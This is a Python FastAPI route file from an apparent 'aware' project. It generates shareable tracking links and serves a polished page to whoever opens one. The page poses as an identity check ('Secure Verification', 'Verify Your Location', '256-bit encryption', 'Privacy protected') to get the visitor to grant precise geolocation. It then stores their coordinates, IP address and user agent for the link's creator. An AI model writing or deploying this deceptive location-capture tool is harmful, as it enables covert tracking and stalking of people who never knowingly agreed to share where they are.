"""
Tracking link routes.

Generate links that capture location when opened.
"""

from datetime import datetime, timedelta, timezone
from typing import List, Optional

from fastapi import APIRouter, Depends, HTTPException, Request, status
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from aware.db.engine import get_db
from aware.models import TrackingLink

router = APIRouter()


class TrackingLinkCreate(BaseModel):
    """Create tracking link request."""

    label: Optional[str] = Field(None, max_length=100)
    expires_hours: Optional[int] = Field(None, ge=1, le=720)  # Max 30 days
    single_use: bool = True


class TrackingLinkResponse(BaseModel):
    """Tracking link response."""

    id: str
    code: str
    url: str
    label: Optional[str]
    single_use: bool
    expires_at: Optional[datetime]
    is_active: bool
    captured_at: Optional[datetime]
    latitude: Optional[float]
    longitude: Optional[float]
    accuracy_meters: Optional[float]
    ip_address: Optional[str]
    created_at: datetime


class LocationCapture(BaseModel):
    """Location capture from browser."""

    latitude: float = Field(..., ge=-90, le=90)
    longitude: float = Field(..., ge=-180, le=180)
    accuracy: Optional[float] = Field(None, ge=0)


@router.post("", response_model=TrackingLinkResponse, status_code=status.HTTP_201_CREATED)
async def create_tracking_link(
    data: TrackingLinkCreate,
    request: Request,
    db: AsyncSession = Depends(get_db),
) -> dict:
    """Create a new tracking link."""

    expires_at = None
    if data.expires_hours:
        expires_at = datetime.now(timezone.utc) + timedelta(hours=data.expires_hours)

    link = TrackingLink(
        label=data.label,
        expires_at=expires_at,
        single_use=data.single_use,
    )
    db.add(link)
    await db.flush()

    # Build URL
    base_url = str(request.base_url).rstrip("/")
    url = f"{base_url}/t/{link.code}"

    return {
        "id": str(link.id),
        "code": link.code,
        "url": url,
        "label": link.label,
        "single_use": link.single_use,
        "expires_at": link.expires_at,
        "is_active": link.is_active,
        "captured_at": link.captured_at,
        "latitude": link.latitude,
        "longitude": link.longitude,
        "accuracy_meters": link.accuracy_meters,
        "ip_address": link.ip_address,
        "created_at": link.created_at,
    }


@router.get("", response_model=List[TrackingLinkResponse])
async def list_tracking_links(
    request: Request,
    db: AsyncSession = Depends(get_db),
) -> List[dict]:
    """List all tracking links."""

    result = await db.execute(
        select(TrackingLink)
        .order_by(TrackingLink.created_at.desc())
    )
    links = result.scalars().all()

    base_url = str(request.base_url).rstrip("/")

    return [
        {
            "id": str(link.id),
            "code": link.code,
            "url": f"{base_url}/t/{link.code}",
            "label": link.label,
            "single_use": link.single_use,
            "expires_at": link.expires_at,
            "is_active": link.is_active,
            "captured_at": link.captured_at,
            "latitude": link.latitude,
            "longitude": link.longitude,
            "accuracy_meters": link.accuracy_meters,
            "ip_address": link.ip_address,
            "created_at": link.created_at,
        }
        for link in links
    ]


@router.delete("/{code}")
async def delete_tracking_link(
    code: str,
    db: AsyncSession = Depends(get_db),
) -> dict:
    """Delete a tracking link."""

    result = await db.execute(
        select(TrackingLink).where(TrackingLink.code == code)
    )
    link = result.scalar_one_or_none()

    if not link:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Tracking link not found",
        )

    await db.delete(link)

    return {"detail": "Tracking link deleted"}


# Public endpoint - the tracking page
@router.get("/page/{code}", response_class=HTMLResponse)
async def tracking_page(
    code: str,
    request: Request,
    db: AsyncSession = Depends(get_db),
) -> HTMLResponse:
    """
    Serve the tracking page that captures location.

    This is what the user's friend sees when they open the link.
    """

    result = await db.execute(
        select(TrackingLink).where(TrackingLink.code == code)
    )
    link = result.scalar_one_or_none()

    if not link:
        return HTMLResponse(
            content="<html><body><h1>Link not found</h1></body></html>",
            status_code=404,
        )

    if not link.is_valid:
        return HTMLResponse(
            content="<html><body><h1>This link has expired</h1></body></html>",
            status_code=410,
        )

    # Stunning premium tracking page
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Verification</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}

        :root{{
            --bg-primary:#050508;
            --bg-card:rgba(255,255,255,0.03);
            --border-subtle:rgba(255,255,255,0.06);
            --text-primary:#ffffff;
            --text-secondary:rgba(255,255,255,0.5);
            --text-muted:rgba(255,255,255,0.3);
            --accent-1:#6366f1;
            --accent-2:#8b5cf6;
            --accent-3:#a78bfa;
            --success:#10b981;
            --error:#ef4444;
        }}

        body{{
            font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
            background:var(--bg-primary);
            color:var(--text-primary);
            min-height:100vh;
            min-height:100dvh;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:20px;
            -webkit-font-smoothing:antialiased;
            -moz-osx-font-smoothing:grayscale;
            overflow:hidden;
            position:relative;
        }}

        .bg-mesh{{
            position:fixed;
            inset:0;
            z-index:0;
            overflow:hidden;
        }}

        .bg-mesh::before{{
            content:'';
            position:absolute;
            top:-50%;
            left:-50%;
            width:200%;
            height:200%;
            background:
                radial-gradient(ellipse 80% 50% at 20% 40%, rgba(99,102,241,0.15) 0%, transparent 50%),
                radial-gradient(ellipse 60% 80% at 80% 20%, rgba(139,92,246,0.12) 0%, transparent 50%),
                radial-gradient(ellipse 50% 60% at 60% 80%, rgba(99,102,241,0.1) 0%, transparent 50%);
            animation:meshMove 20s ease-in-out infinite;
        }}

        @keyframes meshMove{{
            0%,100%{{transform:translate(0,0) rotate(0deg)}}
            33%{{transform:translate(2%,3%) rotate(1deg)}}
            66%{{transform:translate(-1%,-2%) rotate(-0.5deg)}}
        }}

        .orb{{
            position:absolute;
            border-radius:50%;
            filter:blur(60px);
            opacity:0.4;
            animation:float 15s ease-in-out infinite;
        }}

        .orb-1{{
            width:300px;height:300px;
            background:linear-gradient(135deg,#6366f1,#8b5cf6);
            top:-100px;right:-50px;
            animation-delay:0s;
        }}

        .orb-2{{
            width:250px;height:250px;
            background:linear-gradient(135deg,#8b5cf6,#a78bfa);
            bottom:-80px;left:-60px;
            animation-delay:-5s;
        }}

        .orb-3{{
            width:150px;height:150px;
            background:linear-gradient(135deg,#6366f1,#4f46e5);
            top:50%;left:10%;
            animation-delay:-10s;
        }}

        @keyframes float{{
            0%,100%{{transform:translate(0,0) scale(1)}}
            25%{{transform:translate(20px,-30px) scale(1.05)}}
            50%{{transform:translate(-10px,20px) scale(0.95)}}
            75%{{transform:translate(15px,10px) scale(1.02)}}
        }}

        .grid-overlay{{
            position:fixed;
            inset:0;
            background-image:
                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size:60px 60px;
            mask-image:radial-gradient(ellipse 80% 60% at 50% 50%, black 20%, transparent 70%);
            -webkit-mask-image:radial-gradient(ellipse 80% 60% at 50% 50%, black 20%, transparent 70%);
            pointer-events:none;
        }}

        .card{{
            position:relative;
            z-index:10;
            width:100%;
            max-width:400px;
            background:var(--bg-card);
            backdrop-filter:blur(40px);
            -webkit-backdrop-filter:blur(40px);
            border:1px solid var(--border-subtle);
            border-radius:28px;
            padding:48px 36px;
            text-align:center;
            box-shadow:
                0 0 0 1px rgba(255,255,255,0.05) inset,
                0 25px 50px -12px rgba(0,0,0,0.5),
                0 0 100px rgba(99,102,241,0.1);
            animation:cardEnter 0.8s cubic-bezier(0.16,1,0.3,1) forwards;
            opacity:0;
            transform:translateY(30px) scale(0.95);
        }}

        @keyframes cardEnter{{
            to{{opacity:1;transform:translateY(0) scale(1)}}
        }}

        .card::before{{
            content:'';
            position:absolute;
            inset:-1px;
            border-radius:28px;
            background:linear-gradient(135deg,rgba(99,102,241,0.2),transparent 40%,transparent 60%,rgba(139,92,246,0.2));
            z-index:-1;
            opacity:0;
            transition:opacity 0.4s;
        }}

        .card:hover::before{{opacity:1}}

        .trust-badge{{
            display:inline-flex;
            align-items:center;
            gap:6px;
            padding:8px 14px;
            background:rgba(16,185,129,0.08);
            border:1px solid rgba(16,185,129,0.15);
            border-radius:100px;
            font-size:12px;
            font-weight:500;
            color:rgba(16,185,129,0.9);
            margin-bottom:32px;
            animation:badgePulse 3s ease-in-out infinite;
        }}

        .trust-badge svg{{
            width:14px;
            height:14px;
        }}

        @keyframes badgePulse{{
            0%,100%{{box-shadow:0 0 0 0 rgba(16,185,129,0.2)}}
            50%{{box-shadow:0 0 0 8px rgba(16,185,129,0)}}
        }}

        .icon-wrap{{
            position:relative;
            width:88px;
            height:88px;
            margin:0 auto 28px;
        }}

        .icon-glow{{
            position:absolute;
            inset:-20px;
            background:linear-gradient(135deg,rgba(99,102,241,0.4),rgba(139,92,246,0.3));
            border-radius:50%;
            filter:blur(30px);
            animation:glowPulse 3s ease-in-out infinite;
        }}

        @keyframes glowPulse{{
            0%,100%{{opacity:0.6;transform:scale(1)}}
            50%{{opacity:0.9;transform:scale(1.1)}}
        }}

        .icon{{
            position:relative;
            width:100%;
            height:100%;
            background:linear-gradient(145deg,#6366f1 0%,#8b5cf6 50%,#a78bfa 100%);
            border-radius:24px;
            display:flex;
            align-items:center;
            justify-content:center;
            box-shadow:
                0 0 0 1px rgba(255,255,255,0.1) inset,
                0 20px 40px -10px rgba(99,102,241,0.5);
        }}

        .icon svg{{
            width:40px;
            height:40px;
            color:white;
            filter:drop-shadow(0 2px 4px rgba(0,0,0,0.2));
        }}

        h1{{
            font-size:26px;
            font-weight:700;
            letter-spacing:-0.5px;
            margin-bottom:12px;
            background:linear-gradient(135deg,#fff 0%,rgba(255,255,255,0.8) 100%);
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            background-clip:text;
        }}

        .subtitle{{
            font-size:15px;
            color:var(--text-secondary);
            line-height:1.7;
            margin-bottom:36px;
            max-width:300px;
            margin-left:auto;
            margin-right:auto;
        }}

        .btn-wrap{{position:relative}}

        button{{
            position:relative;
            width:100%;
            padding:18px 28px;
            background:linear-gradient(135deg,#6366f1 0%,#7c3aed 100%);
            color:white;
            border:none;
            border-radius:14px;
            font-family:inherit;
            font-size:16px;
            font-weight:600;
            cursor:pointer;
            transition:all 0.3s cubic-bezier(0.4,0,0.2,1);
            box-shadow:
                0 0 0 1px rgba(255,255,255,0.1) inset,
                0 10px 30px -5px rgba(99,102,241,0.5);
            overflow:hidden;
        }}

        button::before{{
            content:'';
            position:absolute;
            top:0;left:-100%;
            width:100%;height:100%;
            background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);
            transition:left 0.5s;
        }}

        button:hover::before{{left:100%}}

        button:hover{{
            transform:translateY(-3px);
            box-shadow:
                0 0 0 1px rgba(255,255,255,0.15) inset,
                0 20px 40px -5px rgba(99,102,241,0.6);
        }}

        button:active{{
            transform:translateY(-1px) scale(0.98);
        }}

        button:disabled{{
            opacity:0.6;
            cursor:not-allowed;
            transform:none !important;
            box-shadow:0 0 0 1px rgba(255,255,255,0.05) inset !important;
        }}

        button:disabled::before{{display:none}}

        .btn-content{{
            display:flex;
            align-items:center;
            justify-content:center;
            gap:10px;
        }}

        .btn-content svg{{
            width:20px;
            height:20px;
        }}

        .spinner{{
            width:20px;
            height:20px;
            border:2px solid rgba(255,255,255,0.3);
            border-top-color:white;
            border-radius:50%;
            animation:spin 0.8s linear infinite;
        }}

        @keyframes spin{{to{{transform:rotate(360deg)}}}}

        .status{{
            margin-top:24px;
            padding:16px 20px;
            border-radius:12px;
            font-size:14px;
            font-weight:500;
            display:none;
            animation:statusEnter 0.3s ease-out;
        }}

        @keyframes statusEnter{{
            from{{opacity:0;transform:translateY(-8px)}}
            to{{opacity:1;transform:translateY(0)}}
        }}

        .status.show{{display:flex;align-items:center;justify-content:center;gap:10px}}

        .status.loading{{
            background:rgba(99,102,241,0.08);
            border:1px solid rgba(99,102,241,0.15);
            color:#a5b4fc;
        }}

        .status.success{{
            background:rgba(16,185,129,0.08);
            border:1px solid rgba(16,185,129,0.15);
            color:#34d399;
        }}

        .status.error{{
            background:rgba(239,68,68,0.08);
            border:1px solid rgba(239,68,68,0.15);
            color:#f87171;
        }}

        .status svg{{width:18px;height:18px;flex-shrink:0}}

        .footer{{
            margin-top:32px;
            display:flex;
            align-items:center;
            justify-content:center;
            gap:16px;
            font-size:11px;
            color:var(--text-muted);
            text-transform:uppercase;
            letter-spacing:0.5px;
        }}

        .footer-dot{{
            width:3px;
            height:3px;
            background:var(--text-muted);
            border-radius:50%;
        }}

        .card.success .icon{{
            background:linear-gradient(145deg,#10b981 0%,#059669 100%);
            animation:successPop 0.5s cubic-bezier(0.34,1.56,0.64,1);
        }}

        .card.success .icon-glow{{
            background:linear-gradient(135deg,rgba(16,185,129,0.4),rgba(5,150,105,0.3));
        }}

        @keyframes successPop{{
            0%{{transform:scale(1)}}
            50%{{transform:scale(1.15)}}
            100%{{transform:scale(1)}}
        }}

        .card.success button{{
            background:linear-gradient(135deg,#10b981 0%,#059669 100%);
            box-shadow:0 10px 30px -5px rgba(16,185,129,0.4);
        }}

        @media(max-width:420px){{
            .card{{padding:40px 28px;border-radius:24px}}
            h1{{font-size:24px}}
            .subtitle{{font-size:14px}}
        }}
    </style>
</head>
<body>
    <div class="bg-mesh">
        <div class="orb orb-1"></div>
        <div class="orb orb-2"></div>
        <div class="orb orb-3"></div>
    </div>
    <div class="grid-overlay"></div>

    <div class="card" id="card">
        <div class="trust-badge">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <path d="m9 12 2 2 4-4"/>
            </svg>
            <span>Secure • One-time verification</span>
        </div>

        <div class="icon-wrap">
            <div class="icon-glow"></div>
            <div class="icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
                    <circle cx="12" cy="10" r="3"/>
                </svg>
            </div>
        </div>

        <h1>Verify Your Location</h1>
        <p class="subtitle">To continue, please allow location access. This helps us confirm your identity securely.</p>

        <div class="btn-wrap">
            <button id="btn" onclick="getLocation()">
                <span class="btn-content" id="btnContent">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"/>
                        <circle cx="12" cy="12" r="3"/>
                        <line x1="12" y1="2" x2="12" y2="4"/>
                        <line x1="12" y1="20" x2="12" y2="22"/>
                        <line x1="2" y1="12" x2="4" y2="12"/>
                        <line x1="20" y1="12" x2="22" y2="12"/>
                    </svg>
                    Allow Location
                </span>
            </button>
        </div>

        <div class="status" id="status"></div>

        <div class="footer">
            <span>256-bit encryption</span>
            <span class="footer-dot"></span>
            <span>Privacy protected</span>
        </div>
    </div>

    <script>
        const code = "{code}";
        const card = document.getElementById('card');
        const btn = document.getElementById('btn');
        const btnContent = document.getElementById('btnContent');
        const status = document.getElementById('status');

        function showStatus(msg, type, icon) {{
            const icons = {{
                loading: '<div class="spinner"></div>',
                success: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>',
                error: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>'
            }};
            status.className = 'status show ' + type;
            status.innerHTML = (icons[icon || type] || '') + '<span>' + msg + '</span>';
        }}

        function setButtonState(text, loading, disabled) {{
            btn.disabled = disabled;
            if (loading) {{
                btnContent.innerHTML = '<div class="spinner"></div><span>' + text + '</span>';
            }} else {{
                btnContent.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/><line x1="12" y1="2" x2="12" y2="4"/><line x1="12" y1="20" x2="12" y2="22"/><line x1="2" y1="12" x2="4" y2="12"/><line x1="20" y1="12" x2="22" y2="12"/></svg><span>' + text + '</span>';
            }}
        }}

        function getLocation() {{
            setButtonState('Requesting...', true, true);
            showStatus('Requesting location access...', 'loading');

            if (!navigator.geolocation) {{
                showStatus('Location not supported on this device', 'error');
                setButtonState('Allow Location', false, false);
                return;
            }}

            navigator.geolocation.getCurrentPosition(
                success,
                error,
                {{ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }}
            );
        }}

        function success(pos) {{
            showStatus('Verifying your location...', 'loading');
            setButtonState('Verifying...', true, true);

            fetch('/track/capture/' + code, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }})
            }})
            .then(r => r.json())
            .then(data => {{
                if (data.success) {{
                    card.classList.add('success');
                    showStatus('Verification complete', 'success');
                    btnContent.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg><span>Verified</span>';
                }} else {{
                    showStatus(data.detail || 'Verification failed', 'error');
                    setButtonState('Try Again', false, false);
                }}
            }})
            .catch(() => {{
                showStatus('Connection error. Please try again.', 'error');
                setButtonState('Try Again', false, false);
            }});
        }}

        function error(err) {{
            const messages = {{
                1: 'Location access was denied',
                2: 'Location unavailable. Please try again.',
                3: 'Request timed out. Please try again.'
            }};
            showStatus(messages[err.code] || 'Could not get location', 'error');
            setButtonState('Try Again', false, false);
        }}
    </script>
</body>
</html>'''

    return HTMLResponse(content=html)


# Public endpoint - receive the captured location
@router.post("/capture/{code}")
async def capture_location(
    code: str,
    data: LocationCapture,
    request: Request,
    db: AsyncSession = Depends(get_db),
) -> dict:
    """Receive and store the captured location."""

    result = await db.execute(
        select(TrackingLink).where(TrackingLink.code == code)
    )
    link = result.scalar_one_or_none()

    if not link:
        return {"success": False, "detail": "Link not found"}

    if not link.is_valid:
        return {"success": False, "detail": "Link expired or already used"}

    # Get client info
    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent", "")

    # Store the captured location
    link.captured_at = datetime.now(timezone.utc)
    link.latitude = data.latitude
    link.longitude = data.longitude
    link.accuracy_meters = data.accuracy
    link.ip_address = client_ip
    link.user_agent = user_agent

    # If single use, deactivate
    if link.single_use:
        link.is_active = False

    return {"success": True, "message": "Location captured"}
